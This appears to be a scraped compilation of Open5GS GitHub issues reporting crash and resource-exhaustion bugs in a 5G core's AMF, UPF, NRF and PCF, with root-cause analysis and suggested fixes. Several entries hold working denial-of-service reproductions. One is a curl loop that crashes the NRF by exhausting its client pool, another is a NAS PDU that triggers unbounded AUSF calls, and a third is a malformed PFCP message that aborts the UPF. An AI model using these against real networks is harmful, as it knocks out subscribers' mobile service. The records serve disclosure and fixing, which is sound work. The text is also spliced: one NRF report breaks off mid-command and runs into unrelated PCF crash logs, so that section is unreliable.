    ogs_sbi_xact_remove(xact);
    return;
}
```

Additional recommendations:

- Cancel in-flight NRF Discovery transactions when `ran_ue_remove()` is called.
- Audit all `amf_sess_sbi_discover_and_send()` call sites in `ngap-handler.c` for the same race pattern.

### Relevant code paths

- Vulnerable path: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/nnrf-handler.c#L88-L89
- RAN-UE ID snapshot: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/sbi-path.c#L220-L229
- Existing guarded timer path: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/amf-sm.c#L888-L900
- Existing guarded SCP callback path: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/sbi-path.c#L322-L370

### Logs

```shell
Combined lab timeline (2026-05-03 UTC):

The timeline combines AMF logs and lab-control events recorded during reproduction.

15:43:12.560  NF_DEREGISTERED [type:SMF] - SMF removed from NF cache
15:43:22.205  Number of AMF-Sessions is now 1 - PDU Session created
15:43:22.206  No V-SMF Instance - NSSF fallback triggered
15:43:22.206  Try to discover [nnssf-nsselection] - NRF Discovery sent
15:43:22.986  SIGTERM sent to lab nr-gnb - SCTP graceful shutdown - ran_ue freed
15:43:28.651  FATAL: Assertion `ran_ue' failed. (nnrf-handler.c:89)

Crash log:

05/03 15:43:28.651: [amf] FATAL: amf_nnrf_handle_nf_discover:
    Assertion `ran_ue' failed. (../src/amf/nnrf-handler.c:89)

05/03 15:43:28.652: [core] FATAL: backtrace() returned 8 addresses
    (../lib/core/ogs-abort.c:37)

Primary reproduction — Scapy SCTP ABORT method (2026-05-03), 5/5:

Trial 1: PID 1048776 -> 1050641 | FATAL=2
Trial 2: PID 1051542 -> 1053085 | FATAL=2
Trial 3: PID 1053974 -> 1055504 | FATAL=2
Trial 4: PID 1056406 -> 1057950 | FATAL=2
Trial 5: PID 1059542 -> 1060673 | FATAL=2

Additional validation — graceful SCTP shutdown via lab gNB SIGTERM:

PID 963525 -> 964728 | FATAL=2 | Crash time: 2026-05-03 15:43:28.651 UTC
```

### Expected behaviour

AMF should handle the case where `ran_ue_find_by_id()` returns NULL gracefully.

Expected behavior:

- Log an error indicating that the associated RAN-UE context has already been removed.
- Clean up or remove the corresponding SBI transaction as appropriate.
- Return from the NRF Discovery callback without aborting the AMF process.
- Continue serving other active UE sessions.

This behavior would be consistent with existing guarded paths, such as the timer-expiry path in `src/amf/amf-sm.c`, where a missing RAN-UE context is handled without terminating AMF.

### Observed Behaviour

The AMF process terminates immediately when the delayed NRF Discovery response is processed after the associated RAN-UE context has already been removed.

Observed behavior:

- `amf_nnrf_handle_nf_discover()` receives the delayed NRF Discovery response.
- The stored `ran_ue_id` no longer resolves to a valid RAN-UE context.
- `ran_ue_find_by_id(ran_ue_id)` returns NULL.
- `ogs_assert(ran_ue)` fails.
- AMF terminates via `ogs_abort()`.
- All active UE sessions are dropped until AMF restarts.

Reproduction results:

- Scapy SCTP ABORT method: 5/5 successful reproductions under controlled lab conditions.
- Additional validation: graceful SCTP shutdown via lab gNB SIGTERM reproduced the same AMF crash condition.

Observed crash:

```
05/03 15:43:28.651: [amf] FATAL: amf_nnrf_handle_nf_discover:
    Assertion `ran_ue' failed. (../src/amf/nnrf-handler.c:89)
```

### eNodeB/gNodeB

UERANSIM v3.2.8

### UE Models and versions

UERANSIM v3.2.8

items.title: NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE removes ran_ue without deactivating the SMF session, blackholing the UE

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
*Reported by the network engineering team at Research Warrant, from a production 5G SA deployment.*

Follow-up to #4547 / #4566, on the core-side half that #4564 explicitly left open ("a fuller fix ... is left for a follow-up").

When a UE re-registers while the AMF still holds an NG context, `HOLDING_NG_CONTEXT()` (`src/amf/context.h`) orphans the old `ran_ue`, sets `ue_ctx_rel_action = NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE` and starts `t_ng_holding`. When that timer expires, `ngap_handle_ue_context_release_action()` runs:

```c
case NGAP_UE_CTX_REL_NG_CONTEXT_REMOVE:
    ogs_debug("    Action: NG context remove");
    ran_ue_remove(ran_ue);
    break;
```

`src/amf/ngap-handler.c:2067` on `main`.

The RAN context is removed, but **no SBI call is made to the SMF** — no `UpdateSMContext(upCnxState=DEACTIVATED)`, and consequently no PFCP modification. The SMF and UPF keep the PDU session `ACTIVATED`, with a downlink FAR/PDR still pointing at the GTP-U TEID of a RAN context that no longer exists.

The UE is then blackholed: downlink traffic is forwarded to a dead tunnel endpoint.

### Why it does not self-heal

Paging is only ever triggered by an SMF downlink-data-notification, which requires the session to be `DEACTIVATED` and buffering. Because the session stays `ACTIVATED`, the SMF never buffers, never notifies, and the AMF never pages. There is no timer on this state.

In our deployment the only observed recovery is the UE tearing down and re-registering on its own initiative — and when it does, **it is assigned a new IP address**, because the previous PDU session was never released and still holds the old one in the SMF pool. That address change is the clearest external evidence that the session survived the RAN context.

### Reproduction

Trigger the holding path, then let `t_ng_holding` expire without the UE re-establishing:

1. UE registers and establishes a PDU session.
2. Restart the gNB (or otherwise force the UE to re-register) so a second `InitialUEMessage` arrives for the same UE while the AMF still holds the NG context. `HOLDING_NG_CONTEXT()` fires — visible as `Holding NG Context` in the AMF log.
3. Let `t_ng_holding` expire. `Action: NG context remove` is logged and `ran_ue_remove()` runs.
4. Observe: SMF session still `ACTIVATED`; no paging; downlink to the UE's IP is discarded.

We reach this routinely, not exceptionally — over one 11-hour window a single deployment logged `Holding NG Context` 12+ times, from two call sites: `ngap-handler.c` (second `InitialUEMessage` with the same 5G-S-TMSI) and `amf-sm.c` (`NAS MAC verification failed`, where the UE presents a GUTI the AMF cannot verify). Both are ordinary UE behaviour.

### Scope, and why this is not the already-fixed issues

- **#4547 / #4566** — same trigger, and #4566 fixed the receive-side handling (the AMF answering `Error Indication (unknown-local-UE-NGAP-ID)` for RAN resources it had silently dropped). The session-state half was not addressed.
- **#4346** — fixes the `ran_ue->deactivation.group` assert in `amf_nsmf_pdusession_handle_update_sm_context()` by snapshotting the RAN-UE id in the SBI transaction. It does not touch `ngap-handler.c`.
- **#4550** — `amf_ue_set_suci()` shallow-copies `sess_list` onto a new `amf_ue`; that is an `amf_ue`-level transplant, and its proposed fix operates on the old `amf_ue`. The path here removes only the `ran_ue` and leaves the `amf_ue` alive, so that fix would not run.
- **#4575** — `amf_ue` pool-slot leak. Different symptom.

The branch is byte-identical across v2.7.6, v2.7.7, v2.8.0 and current `main` (129-line function, `diff` reports no change), so this is not a regression and not version-specific.

### A complication worth flagging

At the point this branch runs, the `ran_ue` has already been detached from its `amf_ue` (`HOLDING_NG_CONTEXT()` sets `amf_ue_id = OGS_INVALID_POOL_ID`), so the handler may not have a route to the session list it would need to deactivate. If so, the right place to act may be at holding time rather than at timer expiry. We did not want to guess at the intended design — hence an issue rather than a patch.

### We can help validate a fix

We run this on real radio hardware with a fleet of commercial handsets, and the trigger occurs routinely rather than needing to be contrived — so we are in a good position to test a candidate fix under the conditions that actually produce it. Specifically, we can:

- **Run a patched build** on a live SA deployment (USRP B210 + srsRAN gNB, commercial Samsung handsets, private PLMN) and report back what we observe.
- **Capture full logs** for a captured occurrence — AMF, SMF and PFCP — including the `Holding NG Context` → `Action: NG context remove` sequence and the SMF-side session state that follows it. Say what verbosity and which NFs are most useful and we will collect it.
- **Confirm or refute the symptom** on request: whether the session stays `ACTIVATED` after the RAN context is removed, whether paging is ever attempted, and whether the UE is assigned a new IP on its eventual re-registration.
- **Test against the handover path** as a regression check, since any fix here touches a switch that also serves handover release actions.

If the fix turns out to belong at holding time rather than at timer expiry — or needs a design decision we should not be making from outside — we are happy to test whichever shape you prefer rather than push our own.

Environment: v2.7.6, SA, single AMF/SMF/UPF, commercial handsets on a private PLMN.

items.title: [Bug]: amf: unbounded AUSF invocation on NGKSI_ALREADY_IN_USE authentication failures

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
## Summary

open5GS AMF treats a UE-supplied `Authentication Failure (cause #71, ngKSI
already in use)` as an unconditional trigger to request fresh authentication
vectors from AUSF/UDM. The implementation does not validate whether the UE
is making authentication progress before each AUSF round-trip. The
authentication retry state is reset after each Authentication Failure,
allowing an attacker-controlled UE to repeatedly restart the authentication
procedure without reaching the built-in retry limit. A single UE can
therefore sustain repeated AUSF invocations and authentication vector
generation cycles.

This is a **resource-consumption issue** in the control-plane authentication
path, not a classic memory-safety bug. The same function's SynchFailure
handler (`cause #21`) applies a 2-attempt guard; the NGKSI handler has no
equivalent progress check.

## Versions checked

```text
Dynamically reproduced on:
  open5GS v2.7.2 (commit cfc29af, main branch as of 2026-08-08)

Statically confirmed in:
  https://github.com/open5gs/open5gs/blob/main/src/amf/gmm-sm.c#L2163-L2179

The relevant code path is unchanged in all releases that support
5G-AKA authentication.
```

## Root cause

### The NGKSI handler unconditionally calls AUSF

`gmm-sm.c:2163-2179` — the `OGS_5GMM_CAUSE_NGKSI_ALREADY_IN_USE` case
in `gmm_state_authentication()`:

```c
/* src/amf/gmm-sm.c — gmm_state_authentication() */
CASE(OGS_5GMM_CAUSE_NGKSI_ALREADY_IN_USE)
    /*
     * TS 24.501 §5.4.1.2.5 Abnormal cases
     * h) Cause #71 - ngKSI already in use
     */
    ogs_warn("Authentication failure(ngKSI already in use)");

    /* Re-invoke AUSF unconditionally — no progress check */
    amf_ue->nas.amf_ue_ngksi_failure = true;
    ogs_assert(true ==
        amf_ue_sbi_discover_and_send(
            OpenAPI_nf_type_AUSF, amf_ue,
            amf_nausf_auth_build_authenticate));
    break;
```

In this context, **authentication progress** means transitioning toward
successful authentication or terminating the procedure (e.g., via
Authentication Reject), rather than repeatedly restarting 5G-AKA with
fresh vectors from AUSF/UDM. Each NGKSI-triggered AUSF call discards the
previous authentication vector and starts over, which means the UE can
indefinitely prevent progress by sending cause #71 each time.

Each call to `amf_ue_sbi_discover_and_send()` results in an SBI (HTTP/2)
`Nausf_UEAuthentication` request to the AUSF, which in turn fetches fresh
5G-AKA authentication vectors from the UDM/ARPF.

### T3560 retry counter is reset on every Authentication Failure

The authentication failure dispatch path at `gmm-sm.c:2154` calls:

```c
CLEAR_AMF_UE_TIMER(amf_ue->t3560);
```

The `CLEAR_AMF_UE_TIMER` macro (`context.h:601-608`) explicitly resets
`retry_count` to zero:

```c
#define CLEAR_AMF_UE_TIMER(__aMF_UE_TIMER)         \
    do {                                           \
        ogs_timer_stop((__aMF_UE_TIMER).timer);    \
        if ((__aMF_UE_TIMER).pkbuf) {              \
            ogs_pkbuf_free((__aMF_UE_TIMER).pkbuf);\
            (__aMF_UE_TIMER).pkbuf = NULL;         \
        }                                          \
        (__aMF_UE_TIMER).retry_count = 0;          \
    } while(0);
```

When the AMF subsequently sends a new Authentication Request, T3560 is started
afresh with a zero retry count. The T3560 expiry handler (`gmm-sm.c:2257-2268`)
only applies its `max_count` check to retransmissions of a single outstanding
Authentication Request — it never sees an accumulated count across multiple
Authentication Failure → Authentication Request cycles:

```c
/* gmm-sm.c:2257-2268 — T3560 expiry */
if (amf_ue->t3560.retry_count >=
    amf_timer_cfg(AMF_TIMER_T3560)->max_count) {
    /* limit reached — only scoped to retransmissions
     * of one outstanding Auth Request, not cumulative
     * failures across cycles */
    ogs_error("Authentication failure, retry count exceeded");
    ogs_assert(OGS_OK ==
        nas_5gs_send_authentication_reject(amf_ue));
}
```

**Result**: neither the T3560 retry limit nor any per-cause counter constrains
repeat cycles of Authentication Failure (#71) → AUSF → Authentication Request.

### Contrast with SynchFailure handler

In the same function, the SynchFailure handler applies a per-UE guard:

```c
/* gmm-sm.c:2180-2184 */
amf_ue->auth_synch_fail_count++;
if (amf_ue->auth_synch_fail_count >= 2) {
    ogs_warn("[%s] Too many authentication synch failures, "
             "rejecting", amf_ue->suci);
    ogs_assert(OGS_OK ==
        nas_5gs_send_authentication_reject(amf_ue));
    break;
}
```

The only per-UE failure counter in the AMF context is:

```c
/* context.h:432 */
uint8_t auth_synch_fail_count;
```

There is no equivalent `ngksi_fail_count` or global authentication failure
threshold that stops the NGKSI cycle.

### Comparison with free5GC

free5GC's NGKSI handler (`handler.go:2164–2174`) takes a different approach:
it assigns a different KSI value from the existing security context and
re-sends the Authentication Request **without** calling AUSF:

```go
// free5GC: internal/gmm/handler.go
case nasMessage.AuthenticationFailureNgKSI:
    ue.SecurityContext.NgKsi = (ue.SecurityContext.NgKsi + 1) % 8
    ue.GmmLog.Warnf("NGKSI in use — cycled to KSI[%d]",
                     ue.SecurityContext.NgKsi)
    SendAuthenticationRequest(ue)
    return nil
```

This is a local, zero-cost resolution. open5GS's decision to request entirely
new vectors from AUSF/UDM is a valid implementation choice, but doing so
without any progress gate or retry bound creates an asymmetric resource
consumption path for the attacker.

## Protocol context (TS 24.501 §5.4.1.2.5)

Cause #71 (`ngKSI already in use`) is an **abnormal case**, not an
authentication failure in the cryptographic sense. The UE reports that the
ngKSI in the received Authentication Request conflicts with an existing
security context. The network needs to handle the KSI conflict, but TS 24.501 does not
require fetching a new authentication vector for every occurrence.
The network may select a different KSI from an existing security
context, or run a fresh authentication — either approach is permitted.

## Reproduction

A UERANSIM UE (instrumented via its state-learner TCP interface) sends a
pre-encoded Authentication Failure NAS PDU (NGKSI cause) in response to
every Authentication Request from the AMF.

**NAS PDU** (4 bytes):

```
7E 00 59 47
│  │  │  └── EMM Cause: NGKSI_ALREADY_IN_USE (71)
│  │  └───── Message Type: AUTHENTICATION FAILURE (0x59)
│  └──────── Security Header Type: Plain NAS (no security context)
└─────────── EPD: 5GMM (0x7e)
```

The PDU uses a plain (unprotected) security header, which is valid per
TS 24.501 for an Authentication Failure sent before a NAS security context
is established. Cause #71 does not require an Authentication Failure
Parameter IE (unlike SynchFailure, which requires AUTS).

**Test flow:**

1. Start open5GS core (AMF, AUSF, UDM, NRF) and gNB
2. Start UERANSIM UE with state-learner TCP interface (port 45902)
3. UE sends plain-NAS Registration Request → AMF replies with Authentication Request
4. UE enters fuzzing mode and sends the pre-encoded NGKSI failure PDU
5. Repeat step 4 for each incoming Authentication Request

**Observed result — 20 iterations:**

```text
Successful loops:       20 / 20
New AUSF invocations:   20   (Setup NF EndPoint [127.0.0.11:7777] → nausf-handler.c:130)
NGKSI warnings in AMF:  20   (gmm-sm.c:2167)
Authentication Rejects: 0
```

**AMF log evidence (repeating pattern, one per iteration):**

```text
08/08 02:18:25.319: [gmm] WARNING: Authentication failure(ngKSI already in use)
  (../src/amf/gmm-sm.c:2167)
08/08 02:18:25.323: [amf] INFO: Setup NF EndPoint(addr) [127.0.0.11:7777]
  (../src/amf/nausf-handler.c:130)
```

The test was terminated at 20 iterations; the loop showed no sign of
convergence or rejection.

## Dynamic experiments

Two additional experiments were performed to test for hidden bounds and
measure multi-UE resource consumption.

### Experiment 1: Single-UE extended loop (100 iterations)

One UE sustained the NGKSI loop for 100 consecutive iterations without
triggering any Authentication Reject.

```text
UE:                   imsi-999700000000001
Iterations requested: 100
Iterations completed: 100 / 100
Authentication Rejects during test: 0
AMF errors/fatal during test:      0
Wall time:            ~9 minutes
Average per iteration: ~5.4 s
```

**AMF log evidence (02:48–02:57 window):**

```text
NGKSI warnings (ngKSI already in use):    100
AUSF invocations (Setup NF EndPoint AUSF): 100
Authentication Rejects during window:        0
```

After 100 iterations (50× the SynchFailure limit of 2), the AMF continued to
accept and process NGKSI authentication failures identically to iteration 1.
No rate limiting, no progressive back-off, and no automatic UE context release
was observed.

### Experiment 2: Multi-UE concurrent attack (2 UEs partial, 1 UE 27 iterations)

Two additional UEs were started concurrently. One (UE10) completed 27
iterations before manual termination; the other two failed to start due to
subscriber provisioning (not rate limiting). Combined with Experiment 1, the
AMF processed **127 NGKSI authentication failures** within a ~12-minute window
with **zero Authentication Rejects**.

```text
Total NGKSI failures processed (02:48–03:00 window): 127
Total AUSF invocations (same window):                 129
Total Authentication Rejects (same window):             0
AMF errors during test:                                 0
```

Key observation: the AUSF invocation count (129) is slightly higher than the
NGKSI failure count (127) because each new UE registration also triggers an
initial AUSF call to fetch authentication vectors. The AMF does not distinguish
or budget AUSF calls by UE.

### Projected AUSF invocation rate

Based on the measured ~5.4 s/iteration per UE and linear AUSF consumption:

| Attacking UEs | AUSF calls/minute | AUSF calls/hour |
|--------------:|------------------:|----------------:|
| 1             | ~11               | ~660            |
| 10            | ~110              | ~6,600          |
| 100           | ~1,100            | ~66,000         |

Each AUSF call triggers an HTTP/2 SBI transaction, UDM authentication vector
generation, and a new Authentication Request to the UE. In deployments where
AUSF/UDM are shared across multiple AMFs or serve large subscriber bases,
sustained multi-UE attack traffic could meaningfully degrade control-plane
authentication throughput.

## Attack model and preconditions

| Condition | Required? | Notes |
|-----------|-----------|-------|
| Valid SUPI/SUCI | Yes | UE must pass initial identity check |
| SIM / USIM credentials | Yes | AMF calls UDM to fetch subscription and AVs |
| RRC connection | Yes | Standard 5G UE radio access |
| NAS security context | No | Attack uses plain (unprotected) NAS messages |

The attack requires a UE that can complete RRC Setup and exchange
NAS messages with the AMF — equivalent to any 5G-capable device with
a valid subscription.

## Impact assessment

| Aspect | Assessment |
|--------|-----------|
| **Resource consumption** | Each NGKSI failure triggers: AMF→AUSF SBI call → UDM authentication vector generation → new Auth Request. The attacker controls the frequency. |
| **gNB resource** | The UE must maintain RRC-CONNECTED state, consuming gNB radio resources throughout the loop. |
| **No existing bound** | The only per-UE authentication failure counter (`auth_synch_fail_count`) applies exclusively to SynchFailure (cause #21). T3560's retry limit is reset on every Authentication Failure. |
| **Protocol posture** | TS 24.501 does not mandate an AUSF round-trip for cause #71; local KSI resolution is permitted. |

**Suggested severity: Medium** (CVSS 3.1: AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H ≈ 6.5)

The attack vector requires Adjacent (radio) access and a provisioned
subscription, which limits the scope compared to a remote unauthenticated
DoS. Within the 5G control plane, however, the asymmetric resource
consumption is a meaningful availability concern for AMF and AUSF
deployments serving large subscriber populations.

## Suggested fix

### Short-term: add a progress gate

Mirror the SynchFailure pattern by adding a dedicated counter that limits
repeated NGKSI-triggered AUSF invocations for a single UE context.
Use a dedicated constant rather than repurposing the T3560 retransmission
limit, since timer retry policy and authentication failure policy serve
different purposes:

```c
/* In amf-ue-context.h, add: */
#define AMF_AUTH_FAILURE_MAX_COUNT 2
uint8_t auth_ngksi_fail_count;

/* In gmm-sm.c, before the AUSF call: */
amf_ue->auth_ngksi_fail_count++;
if (amf_ue->auth_ngksi_fail_count >=
    AMF_AUTH_FAILURE_MAX_COUNT) {
    ogs_error("[%s] Too many NGKSI authentication failures "
              "(count=%d), rejecting",
              amf_ue->suci, amf_ue->auth_ngksi_fail_count);
    ogs_assert(OGS_OK ==
        nas_5gs_send_authentication_reject(amf_ue));
    break;
}

amf_ue->nas.amf_ue_ngksi_failure = true;
ogs_assert(true ==
    amf_ue_sbi_discover_and_send(
        OpenAPI_nf_type_AUSF, amf_ue,
        amf_nausf_auth_build_authenticate));
```

### Medium-term: avoid unnecessary AUSF round-trips

When a valid security context already exists, the AMF could select an
alternative KSI value from the existing context rather than requesting
entirely new authentication vectors from AUSF/UDM. This is the approach
taken by free5GC and is consistent with TS 24.501, which does not
require a fresh AUSF invocation for cause #71.

### Required changes

| File | Change |
|------|--------|
| `src/amf/amf-ue-context.h:432` | Add `auth_ngksi_fail_count` counter field |
| `src/amf/context.c` (UE init) | Initialize `auth_ngksi_fail_count = 0` |
| `src/amf/gmm-sm.c:2163-2179` | Add counter guard before AUSF call |

items.body: ### Open5GS Release, Revision, or Tag v2.7.7 ### Steps to reproduce Send a PFCP Session Establishment Request containing a FAR with a `ForwardingParameters` grouped IE that includes an `OuterHeaderCreate` IE with **length = 0** (no value bytes). A minimal self-contained Python reproduction script is provided below. No special privileges are required; any host that can reach the UPF's N4 interface can trigger this crash. Run: python open5gs_upf_ohc_zero_len_repro.py [open5gs_upf_ohc_zero_len_repro.py](https://github.com/user-attachments/files/26809342/open5gs_upf_ohc_zero_len_repro.py) ### Logs ```shell Apr 17 03:51:40 free5gc systemd[1]: open5gs-upfd.service: Main process exited, code=dumped, status=6/ABRT Apr 17 03:51:40 free5gc systemd[1]: open5gs-upfd.service: Failed with result 'core-dump'. Apr 17 03:51:42 free5gc systemd[1]: open5gs-upfd.service: Scheduled restart job, restart counter is at 1. Apr 17 03:51:43 free5gc systemd[1]: Started open5gs-upfd.service - Open5GS UPF Daemon. Apr 17 03:51:43 free5gc open5gs-upfd[43500]: Open5GS daemon v2.7.7 ``` ### Expected behaviour When a PFCP Session Establishment Request contains a malformed `OuterHeaderCreate` IE with length = 0, the UPF should reject the request and return a Session Establishment Response with an appropriate error cause value (e.g., Cause = "Mandatory IE missing" or "Invalid length"), without terminating the process. ### Observed Behaviour The UPF process (`open5gs-upfd`) immediately terminates with **SIGABRT** upon receiving the malformed Session Establishment Request. **Root cause:** `OuterHeaderCreate` IE with `length = 0` causes `ogs_pfcp_parse_outer_header_creation()` to leave `far->outer_header_creation.description = 0`. `ogs_pfcp_setup_far_gtpu_node()` then calls `ogs_fatal()` because `description` is zero, which invokes `abort()`. **Impact — Unauthenticated Remote Denial of Service:** Any host that can reach the UPF's N4 (PFCP) port 8805 can crash the UPF with a single UDP packet (after a standard AssocSetup handshake), taking down all active user-plane sessions. Systemd restarts the process, but all active GTP tunnels are destroyed, causing a complete service interruption. The attack can be repeated indefinitely to prevent recovery. **Suggested fix:** In `ogs_pfcp_parse_outer_header_creation()` or `ogs_pfcp_setup_far_gtpu_node()`, validate that the IE length is sufficient and that `description != 0` before proceeding; return `OGS_ERROR` instead of calling `ogs_fatal()`. pcap: [open5gsupfcrash.zip](https://github.com/user-attachments/files/26809381/open5gsupfcrash.zip) ### eNodeB/gNodeB No need ### UE Models and versions No need

items.title: [Bug]: NRF crash on inter-PLMN `GET /nnrf-disc/v1/nf-instances` when a delayed Home-NRF response arrives after the original client disconnects

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts during inter-PLMN discovery forwarding if the original HTTP/2 client
disconnects before the Home-NRF response comes back.

The forwarding path stores a raw `ogs_sbi_stream_t *` inside `nrf_assoc`:

```c
typedef struct nrf_assoc_s {
    ...
    ogs_sbi_stream_t *stream;
} nrf_assoc_t;
```

```c
assoc->stream = stream;
```

When the delayed Home-NRF response arrives, `discover_handler()` reuses that raw
pointer without checking whether the original stream/session is still alive:

```c
stream = assoc->stream;
ogs_assert(stream);
...
ogs_expect(true == ogs_sbi_server_send_response(stream, response));
```

But if the original client timed out and disconnected first, nghttp2 closes the
stream and frees it:

```c
stream = nghttp2_session_get_stream_user_data(session, stream_id);
...
stream_remove(stream);
```

The later response send then walks into `server_send_rspmem_persistent()` with
an invalid socket and aborts:

```c
fd = sock->fd;
ogs_assert(fd != INVALID_SOCKET);
```

This is a distinct crash from the already documented inter-PLMN `SearchResult`
pool-exhaustion issues. Here the attacker only needs a delayed but otherwise
valid Home-NRF response plus a client disconnect.

### Root cause

- Entry route:
  `GET /nnrf-disc/v1/nf-instances`
- Preconditions:
  inter-PLMN forwarding path with `hnrf-uri`, and the original client must
  disconnect before the Home-NRF replies
- Raw association storage:
  `../src/nrf/context.h:44-48`
  and `../src/nrf/context.c:137-153`
- Response callback:
  `../src/nrf/nnrf-handler.c:1360-1405`
- Stream free on disconnect:
  `../lib/sbi/nghttp2-server.c:1306-1327`
- Exact crash site:
  `../lib/sbi/nghttp2-server.c:643`
- Root cause family:
  stale stream / use-after-free style response handling leading to assertion
  abort
- Controlling factor:
  delayed Home-NRF response timing relative to original client disconnect

### Steps to reproduce

1. Start a fake h2c Home-NRF on the Docker `open5gs` network:

```bash
printf 'control\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
docker run --rm -d \
  --name hnrfctl \
  --network open5gs \
  --network-alias hnrfctl \
  -e NRF_FAKE_PORT=80 \
  -v /home/ubuntu/open5gs_277/.audit_tmp:/srv \
  node:24-alpine \
  node /srv/nrf_fake_hnrf.js
```

2. Control case: restart the local NRF and issue the inter-PLMN request with an
   immediate Home-NRF response:

```bash
docker restart nrf
sleep 2

docker run --rm --network open5gs curlimages/curl:8.10.1 \
```

### Steps to reproduce

```shell
04/20 10:09:31.263: [pcf] ERROR: ogs_ipv4_from_string() failed (../src/pcf/context.c:643)

04/20 10:09:31.263: [core] FATAL: backtrace() returned 10 addresses (../lib/core/ogs-abort.c:37)
open5gs-pcfd(+0x1d595) [0x564e9610b595]
open5gs-pcfd(+0xfbcf) [0x564e960fdbcf]
/usr/local/lib/libogscore.so.2(ogs_fsm_dispatch+0x119) [0x7fd1a37d5abc]

/lib/x86_64-linux-gnu/libc.so.6(+0x94ac3) [0x7fd1a2e21ac3]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x44) [0x7fd1a2eb2a84]
```

### Expected behaviour

The PCF should return HTTP 400 with a descriptive error (e.g.,  "Invalid ipv4Address") instead of crashing.

### Observed Behaviour

The PCF process terminates immediately with a FATAL assertion failure and  restarts. The request receives no HTTP response. All active SM Policy sessions are dropped.

### Description

The PCF process crashes with a FATAL assertion failure when a POST request to /npcf-smpolicycontrol/v1/sm-policies is sent with `ipv4Address` set to an empty  string ("") and `pduSessionType` set to "IPV4".

items.title: [Bug]: NRF crash on `POST /nnrf-nfm/v1/subscriptions` by exhausting the SBI client pool

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts when repeated valid `POST /nnrf-nfm/v1/subscriptions` requests use
distinct `nfStatusNotificationUri` hosts and exhaust the fixed `client_pool`.

The subscription creation path accepts the request body, allocates
`subscription_data`, parses the notification URI, and then does:

```c
client = ogs_sbi_client_find(scheme, fqdn, fqdn_port, addr, addr6);
if (!client) {
    client = ogs_sbi_client_add(scheme, fqdn, fqdn_port, addr, addr6);
    ogs_assert(client);
}
```

`ogs_sbi_client_add()` returns `NULL` when `client_pool` is exhausted:

```c
ogs_pool_alloc(&client_pool, &client);
if (!client) {
    ogs_error("No memory in client_pool");
    return NULL;
}
```

Pool sizing makes this reachable before the already-known subscription pool
exhaustion case:

```c
ogs_app()->pool.nf = global_conf.max.peer;
ogs_app()->pool.subscription = ogs_app()->pool.nf * 16;
```

With default settings, `client_pool` is only `64`, while
`subscription_data_pool` is `1024`. An attacker can therefore crash NRF much
earlier simply by varying the notification host across otherwise valid
subscription requests.

### Root cause

- Entry route:
  `POST /nnrf-nfm/v1/subscriptions`
- Exact crash site:
  `../src/nrf/nnrf-handler.c:603`
- Helper failure:
  `../lib/sbi/client.c:115-118`
- Pool sizing:
  `../lib/app/ogs-config.c:79-84`
- Root cause family:
  resource exhaustion leading to assertion abort
- Controlling factor:
  number of distinct notification endpoints that require fresh SBI clients

### Steps to reproduce

1. Resolve the current NRF container IP and reset the container:

```bash
NRF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nrf)
docker restart nrf >/dev/null
sleep 2
echo "$NRF_IP"
```

2. Control case: same route and same body shape, but reuse a single
   notification host for 70 requests. This should not crash NRF.

```bash
i=0
ok=0
while [ $i -lt 70 ]; do
  i=$((i+1))
  code=$(curl --http2-prior-knowledge -sS -o /dev/null -w '%{http_code}' -m 5 \
    -X POST "http://$NRF_IP/nnrf-nfm/v1/subscriptions" \
    -H 'content-type: application/json' \
    --data '{"nfStatusNotificationUri":"http://notify-control.example.org:9999/cb","reqNfType":"AMF","subscrCond":{"nfType":"UDM"}}') || {
      echo "fail_at=$i curl_error"
      break
    }
  [ "$code" = "201" ] || {
    echo "fail_at=$i http_code=$code"
    break
  }
  ok=$i
done
echo "ok=$ok"
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.RestartCount}}' nrf
```

3. Malicious case: restart NRF, then vary only the notification host so each
   request forces a fresh SBI client allocation.

```bash
docker restart nrf >/dev/null
sleep 2
start_ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)

i=0
ok=0
while [ $i -lt 100 ]; do
  i=$((i+1))
  host=$(printf 'notify-%03d.example.org' "$i")
  payload=$(printf \
    '{"nfStatusNotificationUri":"http://%s:9999/cb","reqNfType":"AMF","subscrCond":{"nfType":"UDM"}}' \
    "$host")
  code=$(curl --http2-prior-knowledge -sS -o /dev/null -w '%{http_code}' -m 5 \
    -X POST "http://$NRF_IP/nnrf-nfm/v1/subscriptions" \
    -H 'content-type: application/json' \
    --data "$payload") || {
      echo "fail_at=$i curl_error"
      break
    }
  [ "$code" = "201" ] || {
    echo "fail_at=$i http_code=$code"
    break
  }
  ok=$i
done
echo "ok=$ok"
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}} {{.RestartCount}}' nrf
docker logs --since "$start_ts" nrf 2>&1 | tail -n 12
```

### Logs

```shell
Control run:


ok=70
running 0 0


Malicious run:


curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream
fail_at=65 curl_error
ok=64


Container state after the crash:


exited 139 2026-04-12T06:13:46.384859466Z 0


NRF logs:


04/12 06:13:46.262: [nrf] INFO: Setup NF EndPoint(fqdn) [notify-064.example.org:9999] (../src/nrf/nnrf-handler.c:605)
04/12 06:13:46.262: [nrf] INFO: [c3949bf2-3636-41f1-9eed-dfb664711a2e] Subscription created until 2026-04-13T06:13:46.262674+00:00 [duration:86400000000,validity:86400.000000] (../src/nrf/nnrf-handler.c:633)
